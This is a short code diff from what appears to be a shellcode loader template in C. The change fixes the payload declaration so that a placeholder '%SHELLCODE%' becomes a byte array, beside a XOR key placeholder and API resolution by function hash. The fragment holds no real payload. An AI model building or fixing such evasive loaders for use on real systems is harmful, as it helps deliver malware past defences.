@@ -450,7 +450,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
 
 void main() {
     
-   unsigned char payload = "%SHELLCODE%";
+    unsigned char payload[] = "%SHELLCODE%";
     BYTE key = %XOR_KEY%;
     PVOID exec = NULL;
     DWORD old_protect = 0;
